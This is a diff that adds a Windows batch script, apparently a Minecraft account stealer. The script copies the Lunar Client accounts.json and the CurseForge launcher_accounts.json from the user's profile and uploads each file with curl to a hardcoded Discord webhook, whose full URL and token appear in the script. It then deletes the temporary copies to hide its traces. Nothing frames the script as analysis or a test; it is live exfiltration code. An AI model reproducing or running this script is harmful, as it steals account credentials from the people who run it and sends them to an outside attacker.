@@ -1,1 +1,59 @@
+@echo off
+setlocal
 
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1466804187710099720/92f98uyLb5PNSbL9g53NPC914LmjV409aNKV_ORvPUFNTNQqZaX8UcmxauZs0qIuU4Ne"
+set "JSON_PATH=%USERPROFILE%\.lunarclient\settings\game\accounts.json"
+set "TXT_FILE=%TEMP%\accounts_%random%.txt"
+
+
+if not exist "%JSON_PATH%" (
+    echo [FEHLER] Datei nicht gefunden: %JSON_PATH%
+    pause
+    exit /b 1
+)
+
+where curl >nul 2>&1
+if errorlevel 1 (
+    pause
+    exit /b 1
+)
+
+copy "%JSON_PATH%" "%TXT_FILE%" >nul
+
+for %%F in ("%TXT_FILE%") do set "file_size=%%~zF"
+
+curl -X POST ^
+     -F "content=# Lunar Client" ^
+     -F "file=@%TXT_FILE%" ^
+     "%WEBHOOK_URL%"
+
+del "%TXT_FILE%" 2>nul
+
+set "JSON_PATH=%USERPROFILE%\curseforge\minecraft\Install\launcher_accounts.json"
+set "TXT_FILE=%TEMP%\accounts_%random%.txt"
+
+
+if not exist "%JSON_PATH%" (
+    echo [FEHLER] Datei nicht gefunden: %JSON_PATH%
+    pause
+    exit /b 1
+)
+
+where curl >nul 2>&1
+if errorlevel 1 (
+    pause
+    exit /b 1
+)
+
+copy "%JSON_PATH%" "%TXT_FILE%" >nul
+
+for %%F in ("%TXT_FILE%") do set "file_size=%%~zF"
+
+curl -X POST ^
+     -F "content=# CurseForge Launcher" ^
+     -F "file=@%TXT_FILE%" ^
+     "%WEBHOOK_URL%"
+
+del "%TXT_FILE%" 2>nul
+
+exit /b 0
